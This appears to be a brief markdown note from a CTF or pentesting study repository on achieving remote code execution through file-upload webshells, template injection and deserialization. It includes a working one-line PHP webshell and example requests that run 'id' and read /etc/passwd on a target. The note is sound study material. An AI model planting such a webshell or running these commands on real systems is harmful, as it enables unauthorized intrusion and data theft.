# Remote Code Execution (RCE)

## Table of Contents

- [Remote Code Execution (RCE)](#remote-code-execution-rce)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Vectors Covered](#vectors-covered)
    - [PHP file upload / webshell](#php-file-upload--webshell)
    - [SSTI to RCE](#ssti-to-rce)
    - [Deserialization](#deserialization)
  - [Webshell Reference](#webshell-reference)
  - [References](#references)
    - [Labs](#labs)
    - [Challenges](#challenges)
    - [Web Sites](#web-sites)

---

## Overview

Techniques for achieving RCE through web application vulnerabilities.

---

## Vectors Covered

### PHP file upload / webshell
Upload a malicious PHP file to a server that allows unrestricted file uploads, then trigger execution via a direct HTTP request.

### SSTI to RCE
Escalate a server-side template injection vulnerability to OS command execution. See [`../ssti/`](../ssti/).

### Deserialization
Exploit unsafe deserialization of user-controlled objects to execute arbitrary code.

---

## Webshell Reference

Minimal PHP webshell for upload scenarios:

```php
<?php system($_GET['cmd']); ?>
```

Usage after upload:
```
http://target/uploads/shell.php?cmd=id
http://target/uploads/shell.php?cmd=cat+/etc/passwd
```

---

## References

### Labs
| Source | Name |
|---|---|
| TBD | TBD |

### Challenges
| Source | Name |
|---|---|
| Immersive Labs: Haunted Hollow, Lab 9 | Mirrored Mayhem |
| Holiday Hack Challenge 2024, Act III | Deactivate the Ransomware |

### Web Sites
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks - RCE](https://book.hacktricks.xyz/pentesting-web/rce)
